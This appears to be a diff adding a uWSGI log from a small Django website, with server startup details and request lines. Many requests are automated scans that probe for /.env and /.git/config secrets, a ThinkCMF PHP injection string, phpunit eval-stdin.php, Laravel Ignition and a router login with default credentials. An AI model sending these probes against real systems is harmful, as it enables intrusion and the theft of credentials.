@@ -1,0 +1,1114 @@
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Mon Jun  5 13:02:36 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:3031 fd 3
+Python version: 3.10.6 (main, Mar 10 2023, 10:55:28) [GCC 11.3.0]
+PEP 405 virtualenv detected: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Set PythonHome to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Python main interpreter initialized at 0x55c295761b00
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+-----------------PROJECT_ROOT--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE  **** 
+-----------------static--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/static  ****  /static/
+-----------------media--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/media  ****  /media/
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55c295761b00 pid: 22869 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 22869)
+spawned uWSGI worker 1 (pid: 22870, cores: 2)
+spawned uWSGI worker 2 (pid: 22871, cores: 2)
+spawned uWSGI worker 3 (pid: 22872, cores: 2)
+spawned uWSGI worker 4 (pid: 22873, cores: 2)
+[pid: 22872|app: 0|req: 1/1] 219.78.235.164 () {44 vars in 867 bytes} [Mon Jun  5 09:02:47 2023] GET / => generated 129706 bytes in 661 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 22872|app: 0|req: 2/2] 219.78.235.164 () {44 vars in 871 bytes} [Mon Jun  5 09:08:47 2023] GET /career/ => generated 124280 bytes in 152 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 22870|app: 0|req: 1/3] 219.78.235.164 () {44 vars in 882 bytes} [Mon Jun  5 09:08:49 2023] GET /about-us/ => generated 124291 bytes in 685 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 22870|app: 0|req: 2/4] 219.78.235.164 () {44 vars in 884 bytes} [Mon Jun  5 09:08:51 2023] GET /services/ => generated 124333 bytes in 87 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 22870|app: 0|req: 3/5] 52.167.144.30 () {42 vars in 662 bytes} [Mon Jun  5 09:17:08 2023] GET /contact-us/ => generated 126104 bytes in 130 msecs (HTTP/1.1 200) 8 headers in 360 bytes (1 switches on core 0)
+[pid: 22870|app: 0|req: 4/6] 52.167.144.30 () {42 vars in 640 bytes} [Mon Jun  5 09:17:29 2023] GET / => generated 129706 bytes in 103 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 22870|app: 0|req: 5/7] 66.240.236.109 () {34 vars in 389 bytes} [Mon Jun  5 09:36:57 2023] GET / => generated 129706 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 22870|app: 0|req: 6/8] 198.199.76.233 () {38 vars in 500 bytes} [Mon Jun  5 09:44:33 2023] GET / => generated 129706 bytes in 86 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+Gracefully killing worker 4 (pid: 22873)...
+Gracefully killing worker 3 (pid: 22872)...
+Gracefully killing worker 1 (pid: 22870)...
+Gracefully killing worker 2 (pid: 22871)...
+...gracefully killing workers...
+worker 1 buried after 3 seconds
+worker 2 buried after 3 seconds
+worker 3 buried after 3 seconds
+worker 4 buried after 3 seconds
+binary reloading uWSGI...
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (0.0.0.0:3031)
+running /home/wzr/.local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Mon Jun  5 09:55:34 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 0.0.0.0:3031 fd 3
+Python version: 3.10.6 (main, Mar 10 2023, 10:55:28) [GCC 11.3.0]
+PEP 405 virtualenv detected: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Set PythonHome to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Python main interpreter initialized at 0x5606eaf95fe0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+-----------------PROJECT_ROOT--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE  **** 
+-----------------static--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/static  ****  /static/
+-----------------media--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/media  ****  /media/
+WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0x5606eaf95fe0 pid: 22869 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 22869)
+spawned uWSGI worker 1 (pid: 23749, cores: 2)
+spawned uWSGI worker 2 (pid: 23750, cores: 2)
+spawned uWSGI worker 3 (pid: 23751, cores: 2)
+spawned uWSGI worker 4 (pid: 23752, cores: 2)
+[pid: 23752|app: 0|req: 1/1] 54.36.115.221 () {40 vars in 625 bytes} [Mon Jun  5 10:06:27 2023] POST / => generated 1382 bytes in 389 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 2/2] 54.36.115.221 () {36 vars in 518 bytes} [Mon Jun  5 10:06:28 2023] GET /.env => generated 123376 bytes in 208 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 3/3] 83.97.73.89 () {36 vars in 645 bytes} [Mon Jun  5 10:11:01 2023] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 129706 bytes in 142 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 4/4] 54.36.115.221 () {40 vars in 625 bytes} [Mon Jun  5 10:14:07 2023] POST / => generated 1382 bytes in 2 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 1/5] 54.36.115.221 () {36 vars in 518 bytes} [Mon Jun  5 10:14:07 2023] GET /.env => generated 123376 bytes in 370 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 23751|app: 0|req: 2/6] 45.134.144.212 () {34 vars in 395 bytes} [Mon Jun  5 10:17:08 2023] GET / => generated 129706 bytes in 106 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 5/7] 130.211.54.158 () {42 vars in 560 bytes} [Mon Jun  5 10:39:46 2023] GET / => generated 129706 bytes in 136 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 6/8] 83.97.73.89 () {34 vars in 535 bytes} [Mon Jun  5 10:44:26 2023] GET /actuator/gateway/routes => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 7/9] 83.97.73.89 () {36 vars in 601 bytes} [Mon Jun  5 10:44:28 2023] GET /actuator/gateway/routes/ => generated 123376 bytes in 54 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 8/10] 104.152.52.200 () {30 vars in 371 bytes} [Mon Jun  5 11:08:12 2023] GET / => generated 129706 bytes in 88 msecs (HTTP/1.0 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 9/11] 8.20.101.83 () {34 vars in 414 bytes} [Mon Jun  5 11:19:24 2023] GET /cdn-cgi/trace => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 1/12] 104.28.192.61 () {36 vars in 475 bytes} [Mon Jun  5 11:19:24 2023] GET /cdn-cgi/trace/ => generated 123376 bytes in 1076 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 2/13] 169.197.140.151 () {36 vars in 504 bytes} [Mon Jun  5 11:36:44 2023] GET /.git/config => generated 123376 bytes in 307 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 10/14] 54.36.115.221 () {40 vars in 625 bytes} [Mon Jun  5 11:37:13 2023] POST / => generated 1382 bytes in 8 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 11/15] 54.36.115.221 () {36 vars in 518 bytes} [Mon Jun  5 11:37:13 2023] GET /.env => generated 123376 bytes in 322 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 12/16] 169.197.140.151 () {36 vars in 550 bytes} [Mon Jun  5 11:40:25 2023] GET /.git/config => generated 123376 bytes in 380 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 13/17] 54.36.115.221 () {40 vars in 625 bytes} [Mon Jun  5 12:22:52 2023] POST / => generated 1382 bytes in 11 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 14/18] 54.36.115.221 () {36 vars in 518 bytes} [Mon Jun  5 12:22:52 2023] GET /.env => generated 123376 bytes in 222 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 15/19] 83.97.73.89 () {34 vars in 548 bytes} [Mon Jun  5 12:34:50 2023] GET /solr/admin/info/system?wt=json => generated 0 bytes in 13 msecs (HTTP/1.1 301) 3 headers in 137 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 16/20] 83.97.73.89 () {36 vars in 621 bytes} [Mon Jun  5 12:34:51 2023] GET /solr/admin/info/system/?wt=json => generated 123376 bytes in 205 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 17/21] 162.243.144.26 () {34 vars in 389 bytes} [Mon Jun  5 12:37:00 2023] GET / => generated 129706 bytes in 318 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 18/22] 54.36.115.221 () {40 vars in 625 bytes} [Mon Jun  5 12:45:06 2023] POST / => generated 1382 bytes in 14 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 19/23] 54.36.115.221 () {36 vars in 518 bytes} [Mon Jun  5 12:45:06 2023] GET /.env => generated 123376 bytes in 251 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 20/24] 83.97.73.89 () {38 vars in 704 bytes} [Mon Jun  5 13:12:20 2023] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 123376 bytes in 213 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 21/25] 205.210.31.111 () {30 vars in 594 bytes} [Mon Jun  5 13:21:53 2023] GET / => generated 129706 bytes in 2251 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 22/26] 103.110.32.156 () {40 vars in 563 bytes} [Mon Jun  5 13:26:48 2023] GET / => generated 129706 bytes in 29347 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 3/27] 194.180.48.85 () {48 vars in 873 bytes} [Mon Jun  5 13:29:24 2023] POST /boaform/admin/formLogin => generated 0 bytes in 14 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 23/28] 54.36.115.221 () {40 vars in 625 bytes} [Mon Jun  5 13:47:12 2023] POST / => generated 1382 bytes in 17 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 1)
+[pid: 23750|app: 0|req: 4/29] 54.36.115.221 () {36 vars in 518 bytes} [Mon Jun  5 13:47:12 2023] GET /.env => generated 123376 bytes in 14750 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 25/30] 172.105.128.11 () {34 vars in 482 bytes} [Mon Jun  5 14:38:50 2023] GET / => generated 129706 bytes in 493894 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 25/31] 83.97.73.89 () {36 vars in 616 bytes} [Mon Jun  5 14:42:43 2023] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 123376 bytes in 264715 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 26/32] 45.128.232.62 () {40 vars in 562 bytes} [Mon Jun  5 15:02:32 2023] GET / => generated 129706 bytes in 30538 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 23749|app: 0|req: 1/33] 45.156.128.22 () {34 vars in 477 bytes} [Mon Jun  5 16:21:15 2023] GET / => generated 725 bytes in 107617 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 27/34] 198.235.24.11 () {30 vars in 581 bytes} [Mon Jun  5 16:25:43 2023] GET / => generated 129706 bytes in 9785 msecs (HTTP/1.0 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 23750|app: 0|req: 5/35] 165.154.134.205 () {32 vars in 352 bytes} [Mon Jun  5 17:19:54 2023] GET / => generated 129706 bytes in 921865 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 3/36] 165.154.134.205 () {26 vars in 281 bytes} [Mon Jun  5 17:20:03 2023] OPTIONS / => generated 129706 bytes in 1298022 msecs (HTTP/1.0 200) 7 headers in 224 bytes (1 switches on core 1)
+Mon Jun  5 17:52:33 2023 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) !!!
+Mon Jun  5 17:52:33 2023 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) !!!
+[pid: 23749|app: 0|req: 3/37] 109.237.98.226 () {36 vars in 519 bytes} [Mon Jun  5 17:41:01 2023] GET /.env => generated 725 bytes in 692304 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 29/38] 165.154.36.245 () {38 vars in 651 bytes} [Mon Jun  5 17:22:17 2023] GET / => generated 725 bytes in 1816965 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 29/39] 179.43.177.244 () {30 vars in 336 bytes} [Mon Jun  5 17:30:30 2023] GET / => generated 725 bytes in 1324447 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 4/40] 83.97.73.89 () {36 vars in 594 bytes} [Mon Jun  5 17:53:12 2023] GET /_ignition/execute-solution => generated 0 bytes in 10 msecs (HTTP/1.1 301) 3 headers in 133 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 30/41] 83.97.73.89 () {38 vars in 663 bytes} [Mon Jun  5 17:53:26 2023] GET /_ignition/execute-solution/ => generated 123376 bytes in 23999 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 31/42] 179.43.177.244 () {30 vars in 336 bytes} [Mon Jun  5 18:07:26 2023] GET / => generated 129706 bytes in 111689 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 32/43] 110.78.141.149 () {32 vars in 459 bytes} [Mon Jun  5 19:03:46 2023] GET / => generated 725 bytes in 220144 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 34/44] 185.224.128.114 () {34 vars in 499 bytes} [Mon Jun  5 19:33:55 2023] GET /home.asp => generated 123376 bytes in 823610 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 23749|app: 0|req: 5/45] 179.43.177.244 () {48 vars in 874 bytes} [Mon Jun  5 20:33:24 2023] POST /boaform/admin/formLogin => generated 0 bytes in 213154 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 35/46] 54.36.115.221 () {40 vars in 625 bytes} [Mon Jun  5 20:17:44 2023] POST / => generated 1382 bytes in 2468065 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 36/47] 83.97.73.89 () {34 vars in 507 bytes} [Mon Jun  5 21:45:55 2023] GET /geoserver => generated 0 bytes in 334349 msecs (HTTP/1.1 301) 3 headers in 116 bytes (1 switches on core 0)
+[pid: 23749|app: 0|req: 6/48] 205.210.31.84 () {30 vars in 581 bytes} [Mon Jun  5 20:40:26 2023] GET / => generated 725 bytes in 4264226 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 36/49] 83.97.73.89 () {34 vars in 489 bytes} [Mon Jun  5 19:25:32 2023] GET / => generated 725 bytes in 8757534 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 7/52] 20.119.93.51 () {26 vars in 336 bytes} [Mon Jun  5 22:07:15 2023] GET /nice%20ports%2C/Tri%6Eity.txt%2ebak => generated 725 bytes in 282048 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 38/52] 20.119.93.51 () {26 vars in 274 bytes} [Mon Jun  5 22:07:13 2023] GET / => generated 725 bytes in 284147 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 38/52] 20.119.93.51 () {26 vars in 278 bytes} [Mon Jun  5 22:07:14 2023] OPTIONS / => generated 725 bytes in 283106 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 8/53] 74.82.47.2 () {34 vars in 444 bytes} [Mon Jun  5 22:40:21 2023] GET / => generated 725 bytes in 228463 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 39/54] 74.208.188.149 () {48 vars in 874 bytes} [Mon Jun  5 23:30:57 2023] POST /boaform/admin/formLogin => generated 0 bytes in 18943 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 41/55] 170.64.140.26 () {34 vars in 514 bytes} [Mon Jun  5 23:33:36 2023] GET /client/get_targets => generated 0 bytes in 23849 msecs (HTTP/1.1 301) 3 headers in 125 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 42/56] 170.64.140.26 () {34 vars in 478 bytes} [Mon Jun  5 23:33:25 2023] GET / => generated 725 bytes in 861202 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 42/57] 170.64.140.26 () {36 vars in 578 bytes} [Mon Jun  5 23:34:08 2023] GET / => generated 725 bytes in 817755 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 43/58] 170.64.140.26 () {34 vars in 496 bytes} [Mon Jun  5 23:47:46 2023] GET /bundle.js => generated 725 bytes in 109 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 4/59] 170.64.140.26 () {34 vars in 392 bytes} [Mon Jun  5 23:33:48 2023] GET /upl.php => generated 725 bytes in 837680 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 7/60] 170.64.140.26 () {34 vars in 488 bytes} [Mon Jun  5 23:34:26 2023] GET /1.php => generated 725 bytes in 800619 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 4/61] 170.64.140.26 () {34 vars in 490 bytes} [Mon Jun  5 23:33:54 2023] GET /geoip/ => generated 725 bytes in 831767 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 10/62] 35.203.210.45 () {30 vars in 593 bytes} [Mon Jun  5 23:13:40 2023] GET / => generated 725 bytes in 2045957 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23749|app: 0|req: 10/63] 83.97.73.89 () {36 vars in 542 bytes} [Mon Jun  5 23:15:59 2023] GET / => generated 725 bytes in 1907286 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23750|app: 0|req: 7/64] 170.64.140.26 () {34 vars in 500 bytes} [Mon Jun  5 23:34:18 2023] GET /favicon.ico => generated 725 bytes in 808422 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 8/65] 206.189.184.237 () {38 vars in 562 bytes} [Mon Jun  5 23:54:32 2023] GET / => generated 725 bytes in 1675662 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 44/66] 45.135.232.17 () {28 vars in 382 bytes} [Tue Jun  6 00:15:57 2023] GET /.env => generated 725 bytes in 390496 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 45/67] 198.235.24.17 () {30 vars in 593 bytes} [Tue Jun  6 00:26:16 2023] GET / => generated 725 bytes in 26645 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 46/68] 45.134.144.212 () {34 vars in 395 bytes} [Tue Jun  6 00:53:01 2023] GET / => generated 725 bytes in 4597 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 47/69] 128.1.248.42 () {34 vars in 481 bytes} [Tue Jun  6 02:44:03 2023] GET / => generated 725 bytes in 5201980 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 48/70] 185.180.143.72 () {34 vars in 483 bytes} [Tue Jun  6 04:18:38 2023] GET / => generated 725 bytes in 454516 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 49/71] 102.140.246.118 () {32 vars in 460 bytes} [Tue Jun  6 05:29:34 2023] GET / => generated 725 bytes in 82048 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 50/72] 114.226.194.123 () {26 vars in 368 bytes} [Tue Jun  6 05:32:24 2023] GET /boaform/admin/formLogin?username=user&psd=user => generated 0 bytes in 2097 msecs (HTTP/1.0 301) 3 headers in 153 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 51/73] 107.170.245.26 () {34 vars in 389 bytes} [Tue Jun  6 05:56:07 2023] GET / => generated 725 bytes in 145355 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 52/74] 45.56.108.128 () {30 vars in 471 bytes} [Tue Jun  6 06:31:54 2023] GET /systembc/password.php => generated 725 bytes in 205952 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23749|app: 0|req: 11/75] 94.102.56.151 () {34 vars in 397 bytes} [Tue Jun  6 06:55:32 2023] GET / => generated 725 bytes in 1405312 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 9/76] 83.97.73.89 () {38 vars in 628 bytes} [Tue Jun  6 07:21:36 2023] POST /Autodiscover/Autodiscover.xml => generated 725 bytes in 31152 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 12/77] 94.102.61.10 () {34 vars in 481 bytes} [Tue Jun  6 07:26:37 2023] GET / => generated 725 bytes in 949798 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 5/78] 162.216.150.162 () {30 vars in 595 bytes} [Tue Jun  6 07:46:21 2023] GET / => generated 725 bytes in 40758 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 14/79] 103.187.191.239 () {32 vars in 474 bytes} [Tue Jun  6 08:00:37 2023] GET /nmaplowercheck1686052832 => generated 0 bytes in 23005 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 7/80] 103.187.191.239 () {32 vars in 446 bytes} [Tue Jun  6 08:00:52 2023] GET /evox/about => generated 0 bytes in 18046 msecs (HTTP/1.1 301) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 7/81] 103.187.191.239 () {32 vars in 474 bytes} [Tue Jun  6 08:00:52 2023] GET /nmaplowercheck1686052832 => generated 0 bytes in 20497 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 0)
+[pid: 23749|app: 0|req: 15/82] 103.187.191.219 () {32 vars in 436 bytes} [Tue Jun  6 08:00:58 2023] GET /HNAP1 => generated 0 bytes in 17106 msecs (HTTP/1.1 301) 3 headers in 112 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 11/83] 103.187.191.213 () {34 vars in 462 bytes} [Tue Jun  6 08:00:37 2023] POST /sdk => generated 0 bytes in 49801 msecs (HTTP/1.1 301) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 23749|app: 0|req: 16/84] 103.187.191.212 () {28 vars in 304 bytes} [Tue Jun  6 08:01:10 2023] GET / => generated 725 bytes in 434104 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 9/85] 103.187.191.180 () {34 vars in 480 bytes} [Tue Jun  6 08:01:20 2023] GET / => generated 725 bytes in 423651 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 54/86] 103.187.191.239 () {26 vars in 281 bytes} [Tue Jun  6 08:00:18 2023] OPTIONS / => generated 725 bytes in 485949 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23750|app: 0|req: 11/87] 103.187.191.134 () {26 vars in 277 bytes} [Tue Jun  6 08:00:37 2023] GET / => generated 725 bytes in 466709 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 54/88] 103.187.191.142 () {26 vars in 277 bytes} [Tue Jun  6 08:00:11 2023] GET / => generated 725 bytes in 492822 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23751|app: 0|req: 9/89] 103.187.191.180 () {34 vars in 480 bytes} [Tue Jun  6 08:02:05 2023] GET / => generated 725 bytes in 378979 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23749|app: 0|req: 16/90] 103.187.191.180 () {34 vars in 480 bytes} [Tue Jun  6 08:02:26 2023] GET / => generated 725 bytes in 357870 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 55/91] 192.241.220.15 () {34 vars in 419 bytes} [Tue Jun  6 08:19:32 2023] GET /actuator/health => generated 0 bytes in 667 msecs (HTTP/1.1 301) 3 headers in 122 bytes (1 switches on core 1)
